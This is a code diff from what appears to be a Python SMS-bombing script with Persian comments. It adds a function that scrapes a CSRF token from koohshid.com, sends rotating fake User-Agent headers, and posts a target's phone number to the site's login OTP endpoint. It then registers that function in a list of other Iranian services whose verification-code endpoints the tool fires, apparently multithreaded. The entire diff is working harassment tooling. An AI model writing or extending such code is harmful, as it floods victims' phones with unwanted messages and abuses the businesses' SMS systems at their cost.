@@ -64,6 +64,86 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+def Koohshid(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج CSRF
+        home_response = session.get(
+            "https://koohshid.com/",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج CSRF از صفحه
+        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
+        csrf = csrf_match.group(1) if csrf_match else "5282f04eb5"
+        
+        if not csrf:
+            print(f'{r}[-] Koohshid: Could not extract CSRF token{a}')
+            return False
+        
+        print(f'{g}[+] CSRF Token: {csrf}{a}')
+        
+        # آماده سازی payload
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        payload = {
+            "action": "digits_check_mob",
+            "countrycode": "+98",
+            "mobileNo": formatted_phone,
+            "csrf": csrf,
+            "login": "2",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
+            "json": "1",
+            "whatsapp": "0"
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://koohshid.com",
+            "Referer": "https://koohshid.com/",
+        }
+        
+        response = session.post(
+            "https://koohshid.com/wp-admin/admin-ajax.php",
+            data=payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Koohshid Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Koohshid Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            try:
+                data = response.json()
+                if data.get("success") or "sent" in str(data).lower():
+                    print(f'{g}(Koohshid) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] Koohshid Failed: {data.get("message", "Unknown")}{a}')
+                    return False
+            except:
+                if "1" in response.text or "success" in response.text.lower():
+                    print(f'{g}(Koohshid) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] Koohshid HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Koohshid Exception: {e}{a}')
+        return False
+        
+
 def Okala(phone):
     try:
         url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
@@ -719,7 +799,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [Balad, Besparto, DigikalaJet, Footini, nillarayeshi, Okala, ShahreSandal, SibApp]
+services = [Balad, Besparto, DigikalaJet, Footini, Koohshid, nillarayeshi, Okala, ShahreSandal, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
